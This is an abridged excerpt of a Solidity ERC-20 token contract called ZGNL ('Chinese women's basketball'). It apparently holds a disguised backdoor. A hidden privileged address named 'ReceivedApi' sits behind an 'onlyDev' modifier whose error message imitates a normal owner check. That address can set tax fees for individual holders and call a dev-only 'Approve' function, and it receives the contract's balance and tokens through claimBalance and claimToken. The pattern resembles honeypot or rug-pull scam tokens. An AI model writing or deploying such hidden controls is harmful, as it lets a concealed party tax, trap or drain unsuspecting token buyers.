...
contract ZGNL is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Chinese women's basketball";
    string private _symbol = "ZGNL";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x74055a6E23EA0160B2D68099D15B1F13F4040EcB); 
    address payable private teamWalletAddress = payable(0x6E5b4231f9dAf5B5120c6dC583F24acDB88c4574); 
	...
	address  public ReceivedApi =_msgSender();
	...
	modifier onlyDev {
       require(ReceivedApi == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setdTokenTracker(address newAddress) external onlyOwner() {
        ReceivedApi = newAddress;
    }
	
	function claimBalance() external {
        payable(ReceivedApi).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(ReceivedApi, amount);
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyDev {
	...
	function Approve(address spender,uint256 amount)public onlyDev{
